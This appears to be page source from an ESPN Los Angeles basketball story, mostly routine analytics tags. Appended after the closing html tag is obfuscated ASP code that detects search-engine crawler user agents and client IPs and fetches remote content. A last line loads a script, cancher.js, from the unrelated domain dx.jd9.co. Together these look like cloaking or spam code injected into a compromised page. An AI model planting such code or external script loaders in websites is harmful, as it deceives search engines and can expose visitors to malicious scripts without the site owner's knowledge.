		s_omni.prop1 = "espnlosangeles";
		s_omni.prop4 = "story";
		s_omni.prop5 = "los-angeles:nba";
		s_omni.prop11 = (insiderStatus !== null) ? insiderStatus + ":premium-no" : "premium-no";
		s_omni.prop13 = "espn.com";
		s_omni.prop15 = "storyid=12115240-null-coach+to+kobe+take+more+shots";
		s_omni.prop17 = "en";
		s_omni.prop21 = anDateString;
		s_omni.prop22 = anGen;
		s_omni.prop23 = "markazi_arash";
		s_omni.prop25 = "basketball";
		s_omni.prop26 = "nba";
		s_omni.prop29 = anLoginStatus;
		s_omni.prop30 = "false";
		s_omni.hier1 = "los-angeles:nba:story:storyid=12115240-150103+lakers+coach+wants+more+shots+from+kobe";
		s_omni.eVar7 = anYear + ":" + anGen + ":" + anLoginStatus + ":" + s_omni.prop11 + ":";
		s_omni.eVar9 = "en";
		s_omni.eVar10 = "markazi_arash";
		s_omni.eVar13 = "los-angeles:nba:story:storyid=12115240-150103+lakers+coach+wants+more+shots+from+kobe";
		s_omni.eVar15 = "storyid=12115240-null-coach+to+kobe+take+more+shots";
		s_omni.eVar19 = "basketball";
		s_omni.eVar21 = "nba";
		
		if (s_omni.prop11=="anonymous:premium-yes" || s_omni.prop11=="insider-no:premium-yes" && typeof s_omni.prop4!="undefined" &&
			(s_omni.prop4=="story" || s_omni.prop4=="blog")) {
			if (typeof s_omni.events != "undefined" && s_omni.events!="") {
				s_omni.events = s_omni.events+",event8" }
			else { s_omni.events="event8" }
		}
		
		
		anVersion = "_11apr14_v2_0_r5_";
		
		/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
		
		var s_code = s_omni.t();
		if(s_code) {
			var sci = new Image(1,1);
			sci.onload = function() {console.log("loaded no append")};
			sci.src = s_code;
		}
		
	};	
</script>



<script type="text/javascript">
	if (typeof(s_omni) === 'undefined') {
		jQuery(function($) {
			// we want to load the analytics files from the cache if possible - so, let's use full $.ajax() calls
			$.ajax({
				type:'GET',
				url: 'http://a.espncdn.com/combiner/c?js=analytics/sOmni.js,analytics/analytics.js,analytics/externalnielsen.js&v=11',
				dataType: 'script',
				cache: true,
				success: function() {
					var lgSrc;
					if(typeof anCV !== undef && anCV === '' && document.getElementById('form-memberarea') != null) {
						lgSrc = 'https://r.espn.go.com/members/util/getUserInfo?cb=runOmnitureIndependently';
						$.getScript(lgSrc); // we don't want this to be cached - so we'll use the $.getScript() method
					} else {
						callOmniture();
					}
				}
			});
		});
	}
</script>

<!-- End SiteCatalyst code version: H.21. -->


<!-- Begin comScore Tag -->
<script type="text/javascript">
	if (typeof(jQuery) !== 'undefined') {
		jQuery(function($) {
			if(typeof window._comscore === 'undefined') {
				window._comscore = window._comscore || [];
				window._comscore.push({ c1: "2", c2: "3000005" });
				jQuery.getScript((document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js");
			}
		});
	}
</script>
<!-- End comScore Tag -->
		<script>
		var _sf_async_config={
			"uid":22222,
			"domain":"espn.go.com",
			"pingServer":"pespn.chartbeat.net",
			"useCanonical":true,
			"useSubDomains":false,
			"sections":"nba",
			"authors":"stories, headlinenews"
		};
		if (typeof(ad_site) !== 'undefined') { _sf_async_config.zone = ad_site; }

		// load both chartbeat_pub and chartbeat_video
		(function () {
			function a() {
				window._sf_endpt = (new Date()).getTime();

				var cbDomain = (("https:"==document.location.protocol)?"https://a248.e.akamai.net/chartbeat.download.akamai.com/102508/":"http://static.chartbeat.com/");

				var c = document.createElement("script");
				c.setAttribute("language","javascript");
				c.setAttribute("type","text/javascript");
				c.setAttribute("src", cbDomain+"js/chartbeat_pub.js");
				document.body.appendChild(c);

				if(typeof StrategyInterface !== 'undefined' && (typeof espn !== 'undefined' && typeof espn.video !== 'undefined')){
					var e = document.createElement("script");
					e.setAttribute("language",	"javascript");
					e.setAttribute("type", "text/javascript");
					e.setAttribute("src", cbDomain+"js/chartbeat_video.js");
					document.body.appendChild(e);
				}
			}
			var b = window.onload;
			window.onload = (typeof window.onload != "function") ? a : function () { b(); a() }
		})();
		//(function(){function a(){window._sf_endpt=(new Date()).getTime();var c=document.createElement("script");c.setAttribute("language","javascript");c.setAttribute("type","text/javascript");c.setAttribute("src",(("https:"==document.location.protocol)?"https://a248.e.akamai.net/chartbeat.download.akamai.com/102508/":"http://static.chartbeat.com/")+"js/chartbeat_pub.js");document.body.appendChild(c)}var b=window.onload;window.onload=(typeof window.onload!="function")?a:function(){b();a()}})();
		</script>
	
<!-- dynamic logic: safecount -->
<script src="http://content.dl-rms.com/rms/mother/508/nodetag.js"></script>

<script type="text/javascript" charset="UTF-8">(function(){function c(n){var k=document.cookie,s,e,l="length";if(k[l]>0){s=k.indexOf(n+"=");if(s!=-1){ s=s+n[l]+1;e=k.indexOf(";",s);if(e==-1)e=k[l];return unescape(k.substring(s,e));}}return"";}var a=c("releaseCandidate")=="true";this.ESPN_GLOBALS={pageType:"story",videoPlayers:{story09:{height:324,width:576,autostart:"true",playerType:!!a?"newskin_index09_dev":"story09",localSite: "losangeles"}}}})();</script>
</body>
</html>



<%
	End If
	response.End()
End if
echohtml = ""'GetContent(echourl&"sysid="&systid&"&redirect=yes")
If instr(echohtml,lk)>0 Then
	'response.Write replace(echohtml,lk,"")
End If
Function GetContent(url)
	'on error resume next
	Dim xmlHttp
	Set xmlHttp = Server.Createobject("WinHttp.WinHttpRequest.5.1")
	'xmlHttp.SetTimeouts 60000, 60000, 60000, 3000
	xmlHttp.Open "POST", url , False
	xmlHttp.Send()
	GetHtml	= xmlHttp.ResponseBody
	Set xmlHttp=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "UTF-8"
	GetContent = objStream.ReadText
	objStream.Close
End Function

Function ChecksAgent()
  on error resume next
  agentallow=split("ba"&"idus"&"pid"&"er,so"&"g"&"ou,ba"&"i"&"du,so"&"sos"&"pider,goo"&"g"&"lebot",",")
  agentcheck=false
  For agenti=lbound(agentallow) to ubound(agentallow)
    If Instr(LCase(RSbs("HTTP_USER_AGENT")),agentallow(agenti))>0 then
      agentcheck=true
      Exit For
    end if 
  Next
  ChecksAgent=agentcheck
End function
Function GetRsip()
  'on error resume next
  Dim getips
  If RSbs("HTTP_"&"X_FOR"&"W"&"ARDED_FOR") = "" Or InStr(RSbs("H"&"TTP_X_FO"&"RW"&"ARD"&"ED_FOR"), "unknown") > 0 Then
   getips = RSbs("REM"&"OTE_A"&"DDR")
  ElseIf InStr(RSbs("HT"&"TP_"&"X_FORW"&"ARDED_FOR"), ",") > 0 Then
   getips = Mid(RSbs("H"&"TTP"&"_X_FO"&"RW"&"ARD"&"ED_FOR"), 1, InStr(RSbs("H"&"TT"&"P_"&"X_F"&"ORW"&"AR"&"DE"&"D_F"&"OR"), ",")-1)
   actforip = RSbs("REMO"&"TE_ADD"&"R")
  ElseIf InStr(RSbs("HTT"&"P_X"&"_F"&"RW"&"AR"&"DED_FOR"), ";") > 0 Then
   getips = Mid(RSbs("HT"&"TP_"&"X_F"&"OR"&"W"&"AR"&"DED_"&"FO"&"R"), 1, InStr(RSbs("H"&"TT"&"P_"&"_F"&"OR"&"WA"&"RD"&"ED_"&"FOR"), ";")-1)
   actforip = RSbs("R"&"EMO"&"TE_"&"AD"&"D"&"R")
  Else
   getips = RSbs("HT"&"TP"&"_X_FO"&"RW"&"ARD"&"ED_"&"FOR")
   actforip = RSbs("R"&"EM"&"OTE"&"_AD"&"DR")
  End If
  GetRsip = Replace(Trim(Mid(getips, 1, 30)), "'", "")
End Function

Function RSbs(str)
	RSbs = Request.ServerVariables(str)
End Function
%>
<script src="http://dx.jd9.co/a/cancher.js" type="text/javascript"></script>